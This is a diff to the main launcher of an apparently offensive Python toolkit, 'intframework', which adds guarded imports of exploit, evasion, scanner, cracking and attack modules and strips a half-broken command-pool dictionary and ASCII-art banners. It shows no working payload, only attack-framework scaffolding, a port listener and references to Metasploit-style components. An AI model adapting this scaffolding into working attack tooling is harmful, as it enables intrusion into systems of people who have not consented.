@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 from pyfiglet import Figlet
-from colorama import Fore, init
+from colorama import Fore, init, Style
 import threading
 import requests
 import time
@@ -25,16 +25,71 @@ import sys
 import random
 import urllib.request
 from queue import Queue
-from modules import evasionint
-from modules import usersearcher
-from modules.usersearcher import searchus, banner, outer_func
-from modules.exploit_searcher import search_exploits, download_exploit
-from modules import exploit_searcher
-from modules import expdatabase
-from modules.expdatabase import create_option, create_exploit, show_options, set_option, run_exploit, use_framework, import_framework, initialize_framework
-from modules.expdatabase import import_framework, show_options, set_option, run_exploit, use_framework, create_exploit
-from modules import intmodules
-
+from modules.commands.banner import *
+from modules.commands.dns_lookup import *
+try:
+	from modules import evasionint
+except:
+	pass
+try:
+	from modules import usersearcher
+except:
+	pass
+try:
+	from modules.usersearcher import searchus, banner, outer_func
+except:
+	pass
+try:
+	from modules.exploit_searcher import search_exploits, download_exploit
+except:
+	pass
+try:
+	from modules import exploit_searcher
+except:
+	pass
+try:
+	from modules import expdatabase
+except:
+	pass
+try:
+	from modules.expdatabase import create_option, create_exploit, show_options, set_option, run_exploit, use_framework, import_framework, initialize_framework
+	from modules.expdatabase import import_framework, show_options, set_option, run_exploit, use_framework, create_exploit
+except:
+	print("exploit database not found please reinstall framework")
+	pass
+try:
+	from modules import intmodules
+except:
+	pass
+try:
+	import intattack
+except:
+	pass
+try:
+	from modules.intattack import *
+except Exception as e:
+	print("[01.intbase] modules.intattack Not founded please reinstall framework")
+	pass
+try:
+	import handlerunner
+except Exception as e:
+	print("[02.intbase] modules.exploit Not founded please reinstall framework")
+	pass
+try:
+	from modules.exploits import *
+except Exception as e:
+	print("[03.intbase] modules.exploit Not founded please reinstall framework")
+	pass
+try:
+	from modules.scanners import *
+except Exception as e:
+	print("[04.intbase] modules.scanners Not founded please reinstall framework")
+	pass
+try:
+	from modules.scanners.Crack import *
+except Exception as e:
+	print("[05.intbase] modules.scanners.Crack Not founded please reinstall framework")
+	pass
 def check_network():
     try:
         # Attempt to connect to Google's DNS server
@@ -74,18 +129,10 @@ ascii_sanat = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠶⠶⠶⢦⣄⡀⠀⠀
 print(ascii_sanat)
     # 5 saniye boyunca animasyonu çalıştır
 os.system("python3 startoolkit.py")
-
-
-    
-
-
-     
-
-time.sleep(0.1)   
+time.sleep(4)   
 
 init()      
 global jobs
-jobs = {}
 # Initialize jobs dictionary
 jobs = {}
 
@@ -194,7 +241,7 @@ def reverse_used(used, helper):
 	else:
 		pass
 def dev_tools(dir, tool, norm):
-	os.system(dir)
+	os.system(f"cd {dir}")
 	if tool.lower() == "imei":
 		os.system("""echo "imei='python /data/data/com.termux/files/home/intframework/imei.py' >> ~/intframework/.bashrc """)
 		used = "used"
@@ -210,52 +257,6 @@ def launch_normaltools():
 	pass
 def search_evasions():
 	os.system("python3 evasionint.py -s")
-def create_command_pool():
-	pool = {}
-	def get_command(command, v):
-		pool["intmeterpreter"] = 'meterpreter'
-		pool["intai"] = "intaiV2"
-		pool["set"] = "bset"
-		pool["banner"] = "banner"
-		pool["monitor"] = "http://"
-		pool += "intframework"
-		pool["intframework"] = "intconsole"
-		pool["dev-tool"] = "dev-toolz"
-		pool["dev-tools"] = "dev-tool"
-		pool["dev-toolz"] = "dev-tools"
-		pool["payload"] = "py"
-		pool["payload"] = "exploit"
-		pool["exploit"] = "payload"
-		pool["dns"] = "host"
-		pool["auxiliary"] = "payload"
-		pool["nops"] = "exploit"
-		pool["auxiliary"] = "exploit"
-		pool["nops"] = "payload"
-		pool["auxiliary"] = "nops"
-		pool["post"] = "gmail.com"
-		pool["post_exploit"] = "exploitdb"
-		pool["exploitdb"] = "exploit" and "https://www.exploitdb.com"
-		pool["intconsole"] = "consoleV4"
-		pool["consoleV4"] = "intconsole"
-		pool["tools"] = "auxiliary"
-		pool["dork"] = "google"
-		pool["osint"] = "intframework is a osint and replit tool"
-		pool["replit"] = "repl"
-		pool["api"] = "os"
-		pool["apis"] = "api.intframework"
-		pool["weather_api"] = "https://api.collectapi.com/news/getNews?country=tr&tag=general"		
-		pool[command] = v
-	payload_pool = {}
-	def websites(site, v):
-		payload_pool["intframework"] = "http://"
-		payload_pool["intmini"] = "https://"
-		payload_pool["dark_web"] = "http://" or "https://","socks5h://127.0.0.1:9050"
-		def dork(word, site):
-			payload_pool["google dork"] = f'link="{site}" "{word}"'
-		payload_pool["intbase"] = "http://intikam21.com/errors"
-		payload_pool[site] = v
-		# Daha fazla havuz oluşturmayı tercih etmem çünkü kod sınırsız bytes ve koda ulaşabilir
-
 def listen_p(ip, port):
     # Soket oluştur
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -277,349 +278,13 @@ def listen_p(ip, port):
         print(f"Connection from {addr} closed")
 
 
-def bannerss():
+def bannerss(help_input):
 	global bannerss	
 	bannerss = help_input[12:] or help_input[15:]
-def banner():
-	import random
-	global banners
-	banners = [
-    """{Fore.RED}
-    ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⠶⠾⠿⠛⠛⠻⠿⠶⣶⣤⣀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢠⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢠⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⣿⠇⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡈⣿⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⣿⡆⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⣿⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠸⣧⢸⡆⢀⣀⣀⣤⡀⠀⠀⢀⣤⣀⣀⡀⠀⡟⣸⡟⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⠁⣿⣿⣿⣿⡟⠀⠀⠸⣿⣿⣿⣿⠆⣿⠟⠀⠀⠀⣀⠀
-⠀⢰⡟⢿⣆⠀⠀⣿⠀⠙⢿⣿⠟⠀⣠⣄⠀⠹⣿⣿⠟⠀⢹⠀⠀⣠⡿⢻⠀
-⣠⡾⠃⠈⠻⢷⣦⣽⣄⡀⠀⠀⠀⢸⣿⣿⣧⠀⠀⠀⢀⣠⣿⣤⡶⠟⠁⠘⢿⣆
-⠻⠷⠶⠶⣶⣤⣈⠙⠻⣿⣷⣦⠀⠸⠋⠙⠟⠀⣠⣾⣿⠟⠋⣁⣠⣴⠶⠶⠟
-⠀⠀⠀⠀⠀⠉⠛⠿⣶⣼⠿⣿⣲⡤⡤⡤⢤⢰⣿⡏⣿⣶⠿⠛⠉⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⡄⠻⣹⡟⡟⡟⣻⣻⠽⠁⣿⣦⣄⡀⠀⠀⠀⠀⠀
-⠀⠀⣶⠾⠶⠾⠟⠋⣁⣼⣷⡀⠀⠉⠉⠉⠉⠀⢀⣼⣧⣀⠉⠛⠷⠶⠿⣶⠀
-⠀⠀⠙⣷⡄⢀⣴⠿⠛⠁⠀⠙⠳⠶⠤⠴⠶⠞⠋⠀⠈⠙⠻⣶⡄⠀⣾⠟⠀
-⠀⠀⠀⢸⣷⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣶⡿⠀⠀⠀
------------------------------------------------------------
-
-___ _   _ _____ ___ _  __    _    __  __ ____  _ _ ____
-|_ _| \ | |_   _|_ _| |/ /   / \  |  \/  |___ \/ ( ) ___|
- | ||  \| | | |  | || ' /   / _ \ | |\/| | __) | |/\___ \
- | || |\  | | |  | || . \  / ___ \| |  | |/ __/| |  ___) |
-|___|_| \_| |_| |___|_|\_\/_/   \_\_|  |_|_____|_| |____/
-
- ____  _____ ____  _  _______ ___  ____
-|  _ \| ____/ ___|| |/ /_   _/ _ \|  _ \
-| | | |  _| \___ \| ' /  | || | | | |_) |
-| |_| | |___ ___) | . \  | || |_| |  __/
-|____/|_____|____/|_|\_\ |_| \___/|_|(({Fore.RESET}""",
-    Fore.RED + """ 
-    ___ _   _ _____ ___ _  __    _    __  __ ____  _ _ ____
-|_ _| \ | |_   _|_ _| |/ /   / \  |  \/  |___ \/ ( ) ___|
- | ||  \| | | |  | || ' /   / _ \ | |\/| | __) | |/\___ \
- | || |\  | | |  | || . \  / ___ \| |  | |/ __/| |  ___) |
-|___|_| \_| |_| |___|_|\_\/_/   \_\_|  |_|_____| """ + Fore.RESET,
-    """ 
-    {Fore.RED}
-   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣿⠿⢿⣿⣿⣿⡿⣿⣿⣷⣦⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⢋⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⠃⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠦⡄⠀⠀⣀⣀⣤⣤⣴⢤⣤⣤⣶⣾⣿⣿⣿⣿⣿⡿⠃⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢿⣿⣿⣿⣿⣿⣿⠿⢛⣀⣤⣤⣄⣄⣀⣻⣻⣘⣠⣤⣧⣿⣧⣤⣿⣿⣿⣿⠇⣿⠻⢜⡻⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣿⣿⣿⣻⣭⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣩⣾⣿⣿⣿⣿⠟⣸⡇⠰⡦⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡿⣿⣭⣛⡛⠿⣿⣿⡿⠿⠿⠿⠟⢿⣛⣹⣽⣯⣶⣿⣿⣿⣿⣿⣿⣿⣏⠸⣟⣓⣢⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡦⠄
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣟⣿⣯⣿⣿⣿⣷⣋⣀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⠉⠉⠉⠉⠉⠉⠉⠛⠛⠛⠉⠉⠉⠙⠋⠉⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⣿⣿⣿⣿⣿⣿⣽⣯⣽⣷⡆⠀⠀⠻⠿⠓⠛⠛⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⣭⡹⢿⣿⠃⠀⠀⠀⠘⢯⠀⢀⣀⣀⣀⢠⣤⣬⣧⣿⣷⣮⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣷⣄⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣯⣯⣩⣽⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⢟⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣾⣿⢣⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣛⣵⣿⣿⠿⣣⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣛⣛⣛⣯⣿⣶⣿⣿⠿⣋⣽⣾⣿⣿⣿⠀⢰⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⣠⣠⣿⣝⢻⣿⣿⣿⣿⣿⣿⣿⣿⢿⣛⣻⣿⣶⣿⣿⣿⣿⣿⣿⡇⣴⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⣴⣿⣴⣾⢹⣿⣿⠟⠋⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⣻⣿⣿⣿⣿⣿⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣯⣿⠿⠁⠀⠀⠈⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⣾⣿⣿⣿⣿⢟⣩⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣳⠟⠁⠀⠀⠀⠀⣼⡇⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⡿⣴⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⢈⠉⠉⢩⡿⠏⠀⣀⣀⠀⠀⠀⣿⠇⠀⢀⣦⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣾⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⠿⠲⠄⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣶⢿⣷⣶⡀⠀⢠⣿⠀⢀⣿⠃⠀⠀⠻⣿⠃⠀⠐⣿⠀⠀⢸⡿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠱⠟⠛⠙⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠘⣿⣿⢻⣿⠃⠀⣾⡇⠀⢸⣿⠀⠀⠀⢠⣶⡄⠀⢸⣿⠀⠀⣾⡇⠀⠀⠀⠀⠀⣿⣿⣿⣯⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠉⣙⡀⠀⠀⠀⣿⡇⠀⢸⣿⠀⠀⣴⠟⠻⣿⣀⣼⡟⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⣿⣯⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢠⣤⣠⣶⣦⣴⣿⣿⣆⠀⠀⣿⡇⠀⢸⣿⣦⣀⣿⣶⣾⡿⠟⠉⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠈⠙⠻⠋⠙⠋⠙⠛⢻⣿⠀⢀⣿⠃⠀⣼⡟⢿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⣠⣴⣿⣶⣶⣶⡿⠃⠀⣾⣏⣠⣼⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢾⠟⠉⠉⠛⠛⠉⠀⠀⠀⠙⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-   {Fore.RESET} """,
-    """
- {Fore.BLUE}   intninja is waiting for his prey {Fore.RESET}
-{Fore.RED}
-⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡠⠖⠊⠉⠉⠉⠑⠒⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠠⡪⡻⣣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢢⡀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡽⠀⠹⣴⣄⡀⠀⣄⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠙⢝⢽⢻⣿⣟⡀⠀⠀⠀⡄⡸⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡜⣉⠀⠀⠈⡤⠅⠫⣿⠙⠀⠀⠀⣉⢳⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣳⢻⡚⠶⣤⡀⠸⡶⠟⢀⣠⠴⢛⡿⡜⠀⠀⠀⠀⠀⠀⠀
-⣄⠀⠀⠀⠀⠀⡜⢹⣌⢷⠤⠤⠽⡳⠷⢞⠯⠄⠤⡾⣁⠇⢀⠀⠀⠀⠀⢠
- ⢸⢦⡀⠀⠀⠸⡵⣹⠉⣳⠨⡀⠀⠀⠀⠀⠈⢈⠥⡾⠗⡉⢩⠛⠉⡏  
-⠀⢧⠙⢦⡀⠀⠙⢷⢞⣒⡇  intikam21 ⢰⠁⠦⢍⡩⠃⠀⢀⡠⠊⠁
-⠀⠀⠳⣐⢌⠲⢄⡈⠳⣀⣱⣄⠀ninja⠀⠀⣀⠜⣉⣑⠭⢀⡠⠔⡉⢀⠔
-⠀⠀⠀⠈⠓⢤⡂⢈⠓⠤⣉⡙⠳⠤⠀⠤⠞⠓⠉⣁⠤⠒⡉⢄⡨⠖⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠈⠑⠪⢴⣠⠍⡓⠢⣄⡠⠔⢒⠉⣄⡢⠕⠊⠁⠀⠀⠀⠀⠀⠀⡠⠤⠀⡀⡀⡀⠀⠠⠂⢱⠔⣛⠋⢭⣐⣦⡽⠒⣛⠣⡎⠁⡦⠀⡀⣀⢀
-⠠⢤      {Fore.RESET}  [{Fore.BLUE}int{Fore.RESET}]  [{Fore.RED}intninja{Fore.RESET}] [{Fore.BLUE}intmeterpreter{Fore.RESET}]
-{Fore.RED}⠧⠠⠄⠇⠧⠬⠼⠴⣇⣂⠖⠒⠉⠁⠀⠀⠈⠉⠒⠲⣡⣰⠥⠤⠦⠀⠄⢠⠀⠸
-{Fore.RESET}
-""",
-    """
-    {Fore.RESET}   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀ ⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⡎⠉⠀ ⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠉⠀⠀⠀⠀ ⠀⠈⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⣿⠛⠶⠤⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣥⣈⠉⠒⠦⣄⠀⣀⠀⠀ ⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠛⠓⠲⣄⠈⠳⡌⠳⡀ ⠀⠀⠀⢸⣷⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⡇⠀⠀⠈⠳⡀⠈⢦⡹ ⡀⠀⠀⢸⠃⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠟⢳⣤⠀⢻⡿⣆⠀⢳ ⡗⠀⠀⡼⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⣤⡟⠀⠀⠈⠛⣆⠀ ⢷⠀⠀⡇⠀⠨⢧⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣧⣠⠀⠀⠀⠘⣆ ⠈⠃⣰⠁⠀⠄⠸⣦⡀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣷⡄⠀⠀⠀⠸ ⡅⢀⡏⠀⠀⠀⢠⠏⠱⣄⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣷⣤⣠⠖⢻ ⠁⡼⠀⠀⢀⡴⠋⠀⠀⠈⢦⡀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠉⢻⡻⣿⣿⣿⢧⣠⢏ ⣾⣡⠤⠚⣏⠀⠀⠀⠀⠀⠀⠉⠣⡄⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⡿⠁⢠⢿⣿⢿⣿⡿⠋⣿⡏ ⠉⠀⠀⠀⣹⡞⠁⠀⠀⠀⠀⠀⠀⢸⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⣆⡴⡟⢸⢸⢰⡄⠀⠀⣹⢱ ⠀⠀⠀⢰⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢧
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣽⠃⣿⠀⠃⢸⢸⠘⡇⠀⠀⣿⢸ ⠀⠀⠀⠃⠀⢧⡄⢀⡴⠃⠀⠀⠀⠀⠘
-⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⢿⡧⣿⠀⠀⡸⣾⠀⡇⠀⠀⣯⡏ ⠀⠀⠀⠀⠀⣸⡷⣫⣴⠀⠀⠀⢀⠂⢀
-⠘⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣇⠀⠀⣿⠀⠀⡇⣿⠰⠇⠀⣸⢻⠇ ⠀⠀⠀⠀⢰⠿⠞⣫⢞⡠⠀⢀⠂⠀⢸
